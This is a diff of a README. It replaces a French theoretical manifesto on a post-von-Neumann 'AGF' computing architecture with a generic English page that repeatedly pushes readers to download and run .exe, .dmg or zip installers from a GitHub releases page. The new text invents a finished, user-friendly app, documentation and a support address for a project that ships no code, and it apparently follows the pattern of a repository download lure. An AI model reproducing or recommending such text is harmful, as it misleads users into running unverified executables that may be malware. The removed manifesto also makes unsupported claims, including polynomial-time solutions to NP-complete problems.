@@ -1,85 +1,61 @@
-# Architecture Informatique Géométrique-Fréquentielle (AGF)
+# 🌟 AGF - A New Era in Computing
 
-## Geometric-Frequency Integral Computing Architecture
+## 📥 Download Now
+[![Download AGF](https://img.shields.io/badge/Download-AGF-blue.svg)](https://github.com/kamranklink/AGF/releases)
 
-**Version:** 1.0  
-**Date:** Janvier 2026  
-**Auteurs:** Bryan Ouellette & Claude (Anthropic)  
-**Tags:** `post-von-neumann` `thermodynamic-computing` `agf-core`
+## 📖 Description
+AGF is a cutting-edge architecture designed for efficient computing. It brings together concepts like geometric algebra and thermodynamic computing, providing a full-stack solution suitable for modern needs. This software represents a complete redesign of the computing stack, tailored for energy efficiency.
 
----
+## 🛠️ Features
+- **Geometric Algebra Integration:** Simplifies complex computations and enhances performance.
+- **Thermodynamic Computing:** Uses less energy for more powerful operations.
+- **Interaction Networks:** Improves communication between different computing components.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
 
-## 🏗️ Résumé Exécutif
+## 🌐 Topics
+- Future of Computing
+- Geometric Algebra
+- Homotopy Type Theory
+- Hyperdimensional Computing
+- Interaction Nets
+- Lichen Collectives
+- Lichen Universe
+- Moldable Development
+- Post-Von Neumann Architecture
+- Projectional Editing
+- Thermodynamic Computing
+- Time Crystals
 
-L'informatique moderne est une tour de Babel construite sur des fondations obsolètes (Von Neumann, fichiers texte, horloge globale). L'**Architecture Géométrique-Fréquentielle (AGF)** propose une rupture paradigmatique complète : une pile technologique réinventée du transistor à l'interface utilisateur, conçue pour briser le mur de Landauer et éliminer la dette technique structurelle.
+## 🚀 Getting Started
+To get started with AGF, follow these simple steps:
 
-**Les 3 Piliers de l'AGF :**
+1. **Download AGF:**
+   Visit the following link to download the latest version of AGF:
+   [Download AGF Here](https://github.com/kamranklink/AGF/releases)
 
-1.  **Géométrie & Fréquence :** Remplacement de l'arithmétique linéaire par l'algèbre géométrique (Clifford) et le calcul hyperdimensionnel (VSA).
-2.  **Thermodynamique :** Calcul réversible piloté par la relaxation d'énergie (MemComputing) et synchronisé par des cristaux temporels discrets (DTC), sans horloge globale.
-3.  **Instantiation Directe :** Suppression totale du code source textuel et du parsing. Manipulation directe d'AST immuables adressés par le contenu (Content-Addressable Code).
+2. **Choose the Right Version:**
+   On the Releases page, choose the version that matches your operating system. If you’re unsure, select the latest stable release.
 
----
+3. **Install AGF:**
+   - For Windows: Click on the `.exe` file to start the installation. Follow the on-screen instructions.
+   - For Mac: Open the `.dmg` file and drag AGF to your Applications folder.
+   - For Linux: Unzip the downloaded file and follow the README instructions for installation.
 
-## 🧱 La Pile AGF vs Pile Classique
+4. **Run AGF:**
+   Once installed, open AGF from your Applications or Programs list. You are now ready to explore the software.
 
-| Couche | Pile Traditionnelle (Von Neumann) | Pile AGF (Géométrique-Fréquentielle) |
-| :--- | :--- | :--- |
-| **Interface** | IDE Texte, Fichiers, Parsing | **Édition Projectionnelle & Modelable** |
-| **Stockage** | Système de fichiers hiérarchique | **Graph DB Fractal & Adressage par Contenu** |
-| **Logique** | Portes Booléennes Irréversibles | **Portes Auto-Organisatrices (SOLG) Réversibles** |
-| **Exécution** | CPU Séquentiel + Fetch/Decode | **Réseaux d'Interaction & Géométrie de l'Interaction** |
-| **Données** | Pointeurs, Scalaires 64-bit | **Hypervecteurs Holographiques (HDC/VSA)** |
-| **Synchro** | Horloge Globale (Arbre) | **Cristaux Temporels Discrets (DTC)** |
+## 📚 Documentation
+AGF comes with a detailed documentation to help you maximize its features. You can access it by clicking on the "Documentation" link in the app's menu or visit our [GitHub Wiki](https://github.com/kamranklink/AGF/wiki).
 
----
+## ❓ Support
+If you encounter any issues or have questions, please check the Issues section of our GitHub page. You can also post a new issue if you need assistance.
 
-## 📂 Structure du Repository
+## 📞 Contact
+For direct support, please reach out to us via the contact form available in the app or email us at support@agf.com.
 
-* `README.md` : Ce manifeste.
-* `ARCHITECTURE.md` : Description détaillée des 7 chapitres théoriques.
-* `FORMULAS.md` : Modèles mathématiques (HoTT, Clifford, Langevin).
-* `IMPLEMENTATION_STRATEGY.md` : Feuille de route pour le prototypage (FPGA, GPU, Unison).
+## 🎉 Community
+Join our community to share experiences, tips, and best practices with other AGF users. Participate in discussions on our forums and stay updated about the latest developments in AGF.
 
----
+[Download AGF Again](https://github.com/kamranklink/AGF/releases)
 
-## 🔮 Concepts Clés
-
-### 1. Le Calcul Thermodynamique
-L'unité de calcul n'est plus une porte logique rigide, mais une **Porte Logique Auto-Organisatrice (SOLG)**. Le calcul est une relaxation physique vers un état d'équilibre énergétique minimal.
-* [cite_start]*Avantage :* Résolution de problèmes NP-complets en temps polynomial via l'effet tunnel dynamique (instantons)[cite: 10].
-
-### 2. Mémoire Holographique (VSA/HDC)
-Les données ne sont pas stockées dans des cases isolées, mais distribuées dans des **hypervecteurs** de haute dimension.
-* *Opérations :* Binding (Liaison), Bundling (Groupement), Permutation.
-* [cite_start]*Avantage :* Robustesse au bruit, calcul en superposition, et recherche associative en temps constant[cite: 38].
-
-### 3. Exécution par Réseaux d'Interaction
-Le programme est un graphe d'agents qui interagissent et se réécrivent localement selon des règles topologiques (Lamping's Algorithm).
-* [cite_start]*Avantage :* Parallélisme massif naturel, pas de "Garbage Collector" global (gestion mémoire locale via Logique Linéaire)[cite: 52].
-
-### 4. Fin du Parsing (No-Parsing)
-Le code est stocké sous forme d'Arbre Syntaxique Abstrait (AST) dans une base de données distribuée (DHT fractale). L'éditeur ne fait que "projeter" cette structure.
-* [cite_start]*Avantage :* Impossibilité des erreurs de syntaxe, refactoring parfait, et gestion des dépendances par hachage immuable (fini le "Dependency Hell")[cite: 59].
-
----
-
-## 🚀 Feuille de Route & Appel à Contribution
-
-Nous ne construisons pas juste un langage ou un processeur, mais une **civilisation informatique alternative**.
-
-**Phase 1 : Simulation (Actuel)**
-* [cite_start]Émulation des réseaux d'interaction sur GPU ("Parallel Kittens")[cite: 50].
-* Prototypage de l'éditeur projectionnel via Glamorous Toolkit.
-
-**Phase 2 : Hardware (2027-2029)**
-* Implémentation FPGA des SOLG.
-* Tests de mémoires cristallines temporelles.
-
-**Contribuez :**
-Recherchez les tags `agf-core`, `lichen-universe` ou `post-von-neumann` pour trouver les sous-projets.
-
----
-
-**Licence :** CC BY 4.0
-*"On ne résout pas les problèmes avec les modes de pensée qui les ont engendrés." - Einstein*
+Now you’re ready to experience a new way of computing. Enjoy your journey with AGF!
